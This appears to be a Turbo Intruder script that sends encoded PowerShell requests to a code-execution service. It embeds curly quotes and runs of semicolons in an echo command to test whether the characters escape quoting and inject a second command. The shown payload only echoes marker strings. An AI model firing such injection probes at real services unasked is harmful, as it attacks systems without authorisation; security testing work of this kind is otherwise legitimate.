from urllib import quote, unquote
import base64
import zlib
import subprocess


def command(cmd):
  output = subprocess.check_output(cmd, shell=True)
  return output


def queueRequests(target, WordList):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    mal_arr = [u"\u2018",u"\u0032"]

    for mal in mal_arr:
          mal = mal.encode('utf-8')
          inject_cmd = 'echo \'0xd00'+mal+';;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;echo "ff9111999999"'+mal+'\''
          data_main = 'Vlang\x001\x00powershell\x00F.code.tio\x00'+str(len(inject_cmd))+'\x00'+inject_cmd+'F.input.tio\x000\x00Vargs\x000\x00R'
          cmd = "python pako_encoder.py e "+base64.b64encode(data_main)
          # cmd = "python pako_encoder.py send test"
          data_send = command(cmd).decode("base64")
          print "Sending: ", base64.b64encode(data_send)
          engine.queue(target.req, [len(data_send),data_send])


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status == 200:
        res_text = req.response.split("\r\n")[-1][10:]
        cmd = "python pako_encoder.py d "+base64.b64encode(res_text)
        res = command(cmd).decode("base64")
        print "Receive",repr(res)







